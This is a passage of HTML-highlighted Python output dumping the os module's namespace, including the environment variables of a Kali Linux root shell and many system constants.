class="string">&#x27;removexattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function removexattr&gt;, <span class="string">&#x27;listxattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function listxattr&gt;, <span class="string">&#x27;get_terminal_size&#x27;</span>: &lt;built-<span class="keyword">in</span> function get_terminal_size&gt;, <span class="string">&#x27;cpu_count&#x27;</span>: &lt;built-<span class="keyword">in</span> function cpu_count&gt;, <span class="string">&#x27;get_inheritable&#x27;</span>: &lt;built-<span class="keyword">in</span> function get_inheritable&gt;, <span class="string">&#x27;set_inheritable&#x27;</span>: &lt;built-<span class="keyword">in</span> function set_inheritable&gt;, <span class="string">&#x27;get_blocking&#x27;</span>: &lt;built-<span class="keyword">in</span> function get_blocking&gt;, <span class="string">&#x27;set_blocking&#x27;</span>: &lt;built-<span class="keyword">in</span> function set_blocking&gt;, <span class="string">&#x27;scandir&#x27;</span>: &lt;built-<span class="keyword">in</span> function scandir&gt;, <span class="string">&#x27;fspath&#x27;</span>: &lt;built-<span class="keyword">in</span> function fspath&gt;, <span class="string">&#x27;getrandom&#x27;</span>: &lt;built-<span class="keyword">in</span> function getrandom&gt;, <span class="string">&#x27;memfd_create&#x27;</span>: &lt;built-<span class="keyword">in</span> function memfd_create&gt;, <span class="string">&#x27;waitstatus_to_exitcode&#x27;</span>: &lt;built-<span class="keyword">in</span> function waitstatus_to_exitcode&gt;, <span class="string">&#x27;environ&#x27;</span>: environ(&#123;<span class="string">&#x27;COLORTERM&#x27;</span>: <span class="string">&#x27;truecolor&#x27;</span>, <span class="string">&#x27;DISPLAY&#x27;</span>: <span class="string">&#x27;:0.0&#x27;</span>, <span class="string">&#x27;LANG&#x27;</span>: <span class="string">&#x27;en_US.UTF-8&#x27;</span>, <span class="string">&#x27;LANGUAGE&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;PATH&#x27;</span>: <span class="string">&#x27;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games&#x27;</span>, <span class="string">&#x27;TERM&#x27;</span>: <span class="string">&#x27;xterm-256color&#x27;</span>, <span class="string">&#x27;XAUTHORITY&#x27;</span>: <span class="string">&#x27;/home/kali/.Xauthority&#x27;</span>, <span class="string">&#x27;LS_COLORS&#x27;</span>: <span class="string">&#x27;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36::ow=30;44:&#x27;</span>, <span class="string">&#x27;MAIL&#x27;</span>: <span class="string">&#x27;/var/mail/root&#x27;</span>, <span class="string">&#x27;LOGNAME&#x27;</span>: <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;HOME&#x27;</span>: <span class="string">&#x27;/root&#x27;</span>, <span class="string">&#x27;SHELL&#x27;</span>: <span class="string">&#x27;/usr/bin/zsh&#x27;</span>, <span class="string">&#x27;SUDO_COMMAND&#x27;</span>: <span class="string">&#x27;/usr/bin/su&#x27;</span>, <span class="string">&#x27;SUDO_USER&#x27;</span>: <span class="string">&#x27;kali&#x27;</span>, <span class="string">&#x27;SUDO_UID&#x27;</span>: <span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;SUDO_GID&#x27;</span>: <span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;COMMAND_NOT_FOUND_INSTALL_PROMPT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;POWERSHELL_UPDATECHECK&#x27;</span>: <span class="string">&#x27;Off&#x27;</span>, <span class="string">&#x27;POWERSHELL_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;DOTNET_CLI_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;SHLVL&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;PWD&#x27;</span>: <span class="string">&#x27;/home/kali/Desktop&#x27;</span>, <span class="string">&#x27;OLDPWD&#x27;</span>: <span class="string">&#x27;/home/kali&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_mb&#x27;</span>: <span class="string">&#x27;\x1b[1;31m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_md&#x27;</span>: <span class="string">&#x27;\x1b[1;36m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_me&#x27;</span>: <span class="string">&#x27;\x1b[0m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_so&#x27;</span>: <span class="string">&#x27;\x1b[01;33m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_se&#x27;</span>: <span class="string">&#x27;\x1b[0m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_us&#x27;</span>: <span class="string">&#x27;\x1b[1;32m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_ue&#x27;</span>: <span class="string">&#x27;\x1b[0m&#x27;</span>, <span class="string">&#x27;_&#x27;</span>: <span class="string">&#x27;/usr/bin/python3&#x27;</span>&#125;), <span class="string">&#x27;F_OK&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;R_OK&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;W_OK&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;X_OK&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;NGROUPS_MAX&#x27;</span>: <span class="number">65536</span>, <span class="string">&#x27;TMP_MAX&#x27;</span>: <span class="number">238328</span>, <span class="string">&#x27;WCONTINUED&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;WNOHANG&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;WUNTRACED&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;O_RDONLY&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;O_WRONLY&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;O_RDWR&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;O_NDELAY&#x27;</span>: <span class="number">2048</span>, <span class="string">&#x27;O_NONBLOCK&#x27;</span>: <span class="number">2048</span>, <span class="string">&#x27;O_APPEND&#x27;</span>: <span class="number">1024</span>, <span class="string">&#x27;O_DSYNC&#x27;</span>: <span class="number">4096</span>, <span class="string">&#x27;O_RSYNC&#x27;</span>: <span class="number">1052672</span>, <span class="string">&#x27;O_SYNC&#x27;</span>: <span class="number">1052672</span>, <span class="string">&#x27;O_NOCTTY&#x27;</span>: <span class="number">256</span>, <span class="string">&#x27;O_CREAT&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;O_EXCL&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;O_TRUNC&#x27;</span>: <span class="number">512</span>, <span class="string">&#x27;O_LARGEFILE&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;O_PATH&#x27;</span>: <span class="number">2097152</span>, <span class="string">&#x27;O_TMPFILE&#x27;</span>: <span class="number">4259840</span>, <span class="string">&#x27;PRIO_PROCESS&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;PRIO_PGRP&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;PRIO_USER&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;O_CLOEXEC&#x27;</span>: <span class="number">524288</span>, <span class="string">&#x27;O_ACCMODE&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;SEEK_HOLE&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;SEEK_DATA&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;O_ASYNC&#x27;</span>: <span class="number">8192</span>, <span class="string">&#x27;O_DIRECT&#x27;</span>: <span class="number">16384</span>, <span class="string">&#x27;O_DIRECTORY&#x27;</span>: <span class="number">65536</span>, <span class="string">&#x27;O_NOFOLLOW&#x27;</span>: <span class="number">131072</span>, <span class="string">&#x27;O_NOATIME&#x27;</span>: <span class="number">262144</span>, <span class="string">&#x27;EX_OK&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;EX_USAGE&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;EX_DATAERR&#x27;</span>: <span class="number">65</span>, <span class="string">&#x27;EX_NOINPUT&#x27;</span>: <span class="number">66</span>, <span class="string">&#x27;EX_NOUSER&#x27;</span>: <span class="number">67</span>, <span class="string">&#x27;EX_NOHOST&#x27;</span>: <span class="number">68</span>, <span class="string">&#x27;EX_UNAVAILABLE&#x27;</span>: <span class="number">69</span>, <span class="string">&#x27;EX_SOFTWARE&#x27;</span>: <span class="number">70</span>, <span class="string">&#x27;EX_OSERR&#x27;</span>: <span class="number">71</span>, <span class="string">&#x27;EX_OSFILE&#x27;</span>: <span class="number">72</span>, <span class="string">&#x27;EX_CANTCREAT&#x27;</span>: <span class="number">73</span>, <span class="string">&#x27;EX_IOERR&#x27;</span>: <span class="number">74</span>, <span class="string">&#x27;EX_TEMPFAIL&#x27;</span>: <span class="number">75</span>, <span class="string">&#x27;EX_PROTOCOL&#x27;</span>: <span class="number">76</span>, <span class="string">&#x27;EX_NOPERM&#x27;</span>: <span class="number">77</span>, <span class="string">&#x27;EX_CONFIG&#x27;</span>: <span class="number">78</span>, <span class="string">&#x27;ST_RDONLY&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;ST_NOSUID&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;ST_NODEV&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;ST_NOEXEC&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;ST_SYNCHRONOUS&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;ST_MANDLOCK&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;ST_WRITE&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;ST_APPEND&#x27;</span>: <span class="number">256</span>, <span class="string">&#x27;ST_NOATIME&#x27;</span>: <span class="number">1024</span>, <span class="string">&#x27;ST_NODIRATIME&#x27;</span>: <span class="number">2048</span>, <span class="string">&#x27;ST_RELATIME&#x27;</span>: <span class="number">4096</span>, <span class="string">&#x27;POSIX_FADV_NORMAL&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;POSIX_FADV_SEQUENTIAL&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;POSIX_FADV_RANDOM&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;POSIX_FADV_NOREUSE&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;POSIX_FADV_WILLNEED&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;POSIX_FADV_DONTNEED&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;P_PID&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;P_PGID&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;P_ALL&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;P_PIDFD&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;WEXITED&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;WNOWAIT&#x27;</span>: <span class="number">16777216</span>, <span class="string">&#x27;WSTOPPED&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;CLD_EXITED&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;CLD_KILLED&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;CLD_DUMPED&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;CLD_TRAPPED&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;CLD_STOPPED&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;CLD_CONTINUED&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;F_LOCK&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;F_TLOCK&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;F_ULOCK&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;F_TEST&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;RWF_DSYNC&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;RWF_HIPRI&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;RWF_SYNC&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;RWF_NOWAIT&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;POSIX_SPAWN_OPEN&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;POSIX_SPAWN_CLOSE&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;POSIX_SPAWN_DUP2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;SCHED_OTHER&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;SCHED_FIFO&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;SCHED_RR&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;SCHED_BATCH&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;SCHED_IDLE&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;SCHED_RESET_ON_FORK&#x27;</span>: <span class="number">1073741824</span>, <span class="string">&#x27;XATTR_CREATE&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;XATTR_REPLACE&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;XATTR_SIZE_MAX&#x27;</span>: <span class="number">65536</span>, <span class="string">&#x27;RTLD_LAZY&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;RTLD_NOW&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;RTLD_GLOBAL&#x27;</span>: <span class="number">256</span>, <span class="string">&#x27;RTLD_LOCAL&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;RTLD_NODELETE&#x27;</span>: <span class="number">4096</span>, <span class="string">&#x27;RTLD_NOLOAD&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;RTLD_DEEPBIND&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;GRND_RANDOM&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;GRND_NONBLOCK&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;MFD_CLOEXEC&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;MFD_ALLOW_SEALING&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;MFD_HUGETLB&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;MFD_HUGE_SHIFT&#x27;</span>: <span class="number">26</span>, <span class="string">&#x27;MFD_HUGE_MASK&#x27;</span>: <span class="number">63</span>, <span class="string">&#x27;MFD_HUGE_64KB&#x27;</span>: <span class="number">1073741824</span>, <span class="string">&#x27;MFD_HUGE_512KB&#x27;</span>: <span class="number">1275068416</span>, <span class="string">&#x27;MFD_HUGE_1MB&#x27;</span>: <span class="number">1342177280</span>, <span class="string">&#x27;MFD_HUGE_2MB&#x27;</span>: <span class="number">1409286144</span>, <span class="string">&#x27;MFD_HUGE_8MB&#x27;</span>: <span class="number">1543503872</span>, <span class="string">&#x27;MFD_HUGE_16MB&#x27;</span>: <span class="number">1610612736</span>, <span class="string">&#x27;MFD_HUGE_32MB&#x27;</span>: <span class="number">1677721600</span>, <span class="string">&#x27;MFD_HUGE_256MB&#x27;</span>: <span class="number">1879048192</span>, <span class="string">&#x27;MFD_HUGE_512MB&#x27;</span>: <span class="number">1946157056</span>, <span class="string">&#x27;MFD_HUGE_1GB&#x27;</span>: <span class="number">2013265920</span>, <span class="string">&#x27;MFD_HUGE_2GB&#x27;</span>: <span class="number">2080374784</span>, <span class="string">&#x27;MFD_HUGE_16GB&#x27;</span>: -<span class="number">2013265920</span>, <span class="string">&#x27;pathconf_names&#x27;</span>: &#123;<span class="string">&#x27;PC_ALLOC_SIZE_MIN&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;PC_ASYNC_IO&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;PC_CHOWN_RESTRICTED&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;PC_FILESIZEBITS&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;PC_LINK_MAX&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;PC_MAX_CANON&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;PC_MAX_INPUT&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;PC_NAME_MAX&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;PC_NO_TRUNC&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;PC_PATH_MAX&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;PC_PIPE_BUF&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;PC_PRIO_IO&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;PC_REC_INCR_XFER_SIZE&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;PC_REC_MAX_XFER_SIZE&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;PC_REC_MIN_XFER_SIZE&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;PC_REC_XFER_ALIGN&#x27;</span>: <span class="number">17</span>, <span class="string">&#x27;PC_SOCK_MAXBUF&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;PC_SYMLINK_MAX&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;PC_SYNC_IO&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;PC_VDISABLE&#x27;</span>: <span class="number">8</span>&#125;, <span class="string">&#x27;confstr_names&#x27;</span>: &#123;<span class="string">&#x27;CS_GNU_LIBC_VERSION&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;CS_GNU_LIBPTHREAD_VERSION&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;CS_LFS64_CFLAGS&#x27;</span>: <span class="number">1004</span>, <span class="string">&#x27;CS_LFS64_LDFLAGS&#x27;</span>: <span class="number">1005</span>, <span class="string">&#x27;CS_LFS64_LIBS&#x27;</span>: <span class="number">1006</span>, <span class="string">&#x27;CS_LFS64_LINTFLAGS&#x27;</span>: <span class="number">1007</span>, <span class="string">&#x27;CS_LFS_CFLAGS&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;CS_LFS_LDFLAGS&#x27;</span>: <span class="number">1001</span>, <span class="string">&#x27;CS_LFS_LIBS&#x27;</span>: <span class="number">1002</span>, <span class="string">&#x27;CS_LFS_LINTFLAGS&#x27;</span>: <span class="number">1003</span>, <span class="string">&#x27;CS_PATH&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_CFLAGS&#x27;</span>: <span class="number">1100</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_LDFLAGS&#x27;</span>: <span class="number">1101</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_LIBS&#x27;</span>: <span class="number">1102</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_LINTFLAGS&#x27;</span>: <span class="number">1103</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_CFLAGS&#x27;</span>: <span class="number">1104</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_LDFLAGS&#x27;</span>: <span class="number">1105</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_LIBS&#x27;</span>: <span class="number">1106</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_LINTFLAGS&#x27;</span>: <span class="number">1107</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_CFLAGS&#x27;</span>: <span class="number">1108</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_LDFLAGS&#x27;</span>: <span class="number">1109</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_LIBS&#x27;</span>: <span class="number">1110</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_LINTFLAGS&#x27;</span>: <span class="number">1111</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_CFLAGS&#x27;</span>: <span class="number">1112</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_LDFLAGS&#x27;</span>: <span class="number">1113</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_LIBS&#x27;</span>: <span class="number">1114</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_LINTFLAGS&#x27;</span>: <span class="number">1115</span>&#125;, <span class="string">&#x27;sysconf_names&#x27;</span>: &#123;<span class="string">&#x27;SC_2_CHAR_TERM&#x27;</span>: <span class="number">95</span>, <span class="string">&#x27;SC_2_C_BIND&#x27;</span>: <span class="number">47</span>, <span class="string">&#x27;SC_2_C_DEV&#x27;</span>: <span class="number">48</span>, <span class="string">&#x27;SC_2_C_VERSION&#x27;</span>: <span class="number">96</span>, <span class="string">&#x27;SC_2_FORT_DEV&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;SC_2_FORT_RUN&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;SC_2_LOCALEDEF&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;SC_2_SW_DEV&#x27;</span>: <span class="number">51</span>, <span class="string">&#x27;SC_2_UPE&#x27;</span>: <span class="number">97</span>, <span class="string">&#x27;SC_2_VERSION&#x27;</span>: <span class="number">46</span>, <span class="string">&#x27;SC_AIO_LISTIO_MAX&#x27;</span>: <span class="number">23</span>, <span class="string">&#x27;SC_AIO_MAX&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;SC_AIO_PRIO_DELTA_MAX&#x27;</span>: <span class="number">25</span>, <span class="string">&#x27;SC_ARG_MAX&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;SC_ASYNCHRONOUS_IO&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;SC_ATEXIT_MAX&#x27;</span>: <span class="number">87</span>, <span class="string">&#x27;SC_AVPHYS_PAGES&#x27;</span>: <span class="number">86</span>, <span class="string">&#x27;SC_BC_BASE_MAX&#x27;</span>: <span class="number">36</span>, <span class="string">&#x27;SC_BC_DIM_MAX&#x27;</span>: <span class="number">37</span>, <span class="string">&#x27;SC_BC_SCALE_MAX&#x27;</span>: <span class="number">38</span>, <span class="string">&#x27;SC_BC_STRING_MAX&#x27;</span>: <span class="number">39</span>, <span class="string">&#x27;SC_CHARCLASS_NAME_MAX&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;SC_CHAR_BIT&#x27;</span>: <span class="number">101</span>, <span class="string">&#x27;SC_CHAR_MAX&#x27;</span>: <span class="number">102</span>, <span class="string">&#x27;SC_CHAR_MIN&#x27;</span>: <span class="number">103</span>, <span class="string">&#x27;SC_CHILD_MAX&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;SC_CLK_TCK&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;SC_COLL_WEIGHTS_MAX&#x27;</span>: <span class="number">40</span>, <span class="string">&#x27;SC_DELAYTIMER_MAX&#x27;</span>: <span class="number">26</span>, <span class="string">&#x27;SC_EQUIV_CLASS_MAX&#x27;</span>: <span class="number">41</span>, <span class="string">&#x27;SC_EXPR_NEST_MAX&#x27;</span>: <span class="number">42</span>, <span class="string">&#x27;SC_FSYNC&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;SC_GETGR_R_SIZE_MAX&#x27;</span>: <span class="number">69</span>, <span class="string">&#x27;SC_GETPW_R_SIZE_MAX&#x27;</span>: <span class="number">70</span>, <span class="string">&#x27;SC_INT_MAX&#x27;</span>: <span class="number">104</span>, <span class="string">&#x27;SC_INT_MIN&#x27;</span>: <span class="number">105</span>, <span class="string">&#x27;SC_IOV_MAX&#x27;</span>: <span class="number">60</span>, <span class="string">&#x27;SC_JOB_CONTROL&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;SC_LINE_MAX&#x27;</span>: <span class="number">43</span>, <span class="string">&#x27;SC_LOGIN_NAME_MAX&#x27;</span>: <span class="number">71</span>, <span class="string">&#x27;SC_LONG_BIT&#x27;</span>: <span class="number">106</span>, <span class="string">&#x27;SC_MAPPED_FILES&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;SC_MB_LEN_MAX&#x27;</span>: <span class="number">108</span>, <span class="string">&#x27;SC_MEMLOCK&#x27;</span>: <span class="number">17</span>, <span class="string">&#x27;SC_MEMLOCK_RANGE&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;SC_MEMORY_PROTECTION&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;SC_MESSAGE_PASSING&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;SC_MQ_OPEN_MAX&#x27;</span>: <span class="number">27</span>, <span class="string">&#x27;SC_MQ_PRIO_MAX&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;SC_NGROUPS_MAX&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;SC_NL_ARGMAX&#x27;</span>: <span class="number">119</span>, <span class="string">&#x27;SC_NL_LANGMAX&#x27;</span>: <span class="number">120</span>, <span class="string">&#x27;SC_NL_MSGMAX&#x27;</span>: <span class="number">121</span>, <span class="string">&#x27;SC_NL_NMAX&#x27;</span>: <span class="number">122</span>, <span class="string">&#x27;SC_NL_SETMAX&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;SC_NL_TEXTMAX&#x27;</span>: <span class="number">124</span>, <span class="string">&#x27;SC_NPROCESSORS_CONF&#x27;</span>: <span class="number">83</span>, <span class="string">&#x27;SC_NPROCESSORS_ONLN&#x27;</span>: <span class="number">84</span>, <span class="string">&#x27;SC_NZERO&#x27;</span>: <span class="number">109</span>, <span class="string">&#x27;SC_OPEN_MAX&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;SC_PAGESIZE&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;SC_PAGE_SIZE&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;SC_PASS_MAX&#x27;</span>: <span class="number">88</span>, <span class="string">&#x27;SC_PHYS_PAGES&#x27;</span>: <span class="number">85</span>, <span class="string">&#x27;SC_PII&#x27;</span>: <span class="number">53</span>, <span class="string">&#x27;SC_PII_INTERNET&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;SC_PII_INTERNET_DGRAM&#x27;</span>: <span class="number">62</span>, <span class="string">&#x27;SC_PII_INTERNET_STREAM&#x27;</span>: <span class="number">61</span>, <span class="string">&#x27;SC_PII_OSI&#x27;</span>: <span class="number">57</span>, <span class="string">&#x27;SC_PII_OSI_CLTS&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;SC_PII_OSI_COTS&#x27;</span>: <span class="number">63</span>, <span class="string">&#x27;SC_PII_OSI_M&#x27;</span>: <span class="number">65</span>, <span class="string">&#x27;SC_PII_SOCKET&#x27;</span>: <span class="number">55</span>, <span class="string">&#x27;SC_PII_XTI&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;SC_POLL&#x27;</span>: <span class="number">58</span>, <span class="string">&#x27;SC_PRIORITIZED_IO&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;SC_PRIORITY_SCHEDULING&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;SC_REALTIME_SIGNALS&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;SC_RE_DUP_MAX&#x27;</span>: <span class="number">44</span>, <span class="string">&#x27;SC_RTSIG_MAX&#x27;</span>: <span class="number">31</span>, <span class="string">&#x27;SC_SAVED_IDS&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;SC_SCHAR_MAX&#x27;</span>: <span class="number">111</span>, <span class="string">&#x27;SC_SCHAR_MIN&#x27;</span>: <span class="number">112</span>, <span class="string">&#x27;SC_SELECT&#x27;</span>: <span class="number">59</span>, <span 